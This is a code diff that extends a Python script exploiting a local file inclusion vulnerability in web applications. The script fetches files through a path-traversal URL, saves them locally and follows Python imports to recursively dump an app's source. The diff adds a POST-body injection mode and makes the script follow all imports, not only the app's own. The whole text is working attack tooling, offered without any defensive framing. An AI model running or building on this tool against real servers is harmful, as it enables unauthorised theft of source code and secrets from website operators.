@@ -6,8 +6,12 @@ from argparse import ArgumentParser
 
 
 def leak_file(file_path: str | Path):
-    res = requests.get(LFI_URL + file_path, headers=HEADERS)
-    if res.status_code != 200:
+    if DATA:
+        data = DATA.replace('LFI', file_path)
+        res = requests.post(LFI_URL, headers=HEADERS, data=data)
+    else:
+        res = requests.get(LFI_URL + file_path, headers=HEADERS)
+    if res.status_code != 200 or res.text.startswith("<!DOCTYPE html>"):
         return None
     saved_file = Path(root / file_path)
     saved_file.parent.mkdir(exist_ok=True, parents=True)
@@ -25,14 +29,13 @@ def parse_imports(file_path):
     def traverse(node):
         if isinstance(node, ast.ImportFrom):
             module = node.module
-            if module is not None and PACKAGE_NAME in module:
+            if module is not None:
                 imports[module] = imports[module] if module in imports else []
                 for alias in node.names:
                     imports[module].append(alias.name)
         elif isinstance(node, ast.Import):
             for alias in node.names:
-                if PACKAGE_NAME in alias.name:
-                    imports[alias.name] = None
+                imports[alias.name] = None
         elif isinstance(node, ast.FunctionDef):
             for n in ast.walk(node):
                 if isinstance(n, (ast.Import, ast.ImportFrom)):
@@ -87,13 +90,16 @@ if __name__ == "__main__":
     parser.add_argument('-u', '--url', type=str, required=True, help="Url containing the LFI and the base location of the app, example: http://example.com/?file=../../../var/www/app/")
     parser.add_argument('-m', '--main', default="app.py",help="Main file to start traversing from, usually app.py")
     parser.add_argument('-H', '--headers', type=headers)
+    parser.add_argument('-d', '--data')
 
     args = parser.parse_args()
-    LFI_URL = args.url if args.url.endswith("/") else args.url + "/"
+    LFI_URL = args.url
     MAIN_FILE = args.main.removeprefix("/")
     HEADERS = args.headers
     PACKAGE_NAME = LFI_URL.split('/')[-2]
     ROOT_DIR = "dump"
+    DATA : str = args.data
+
     root = Path(Path.cwd() / ROOT_DIR)
 
     main()
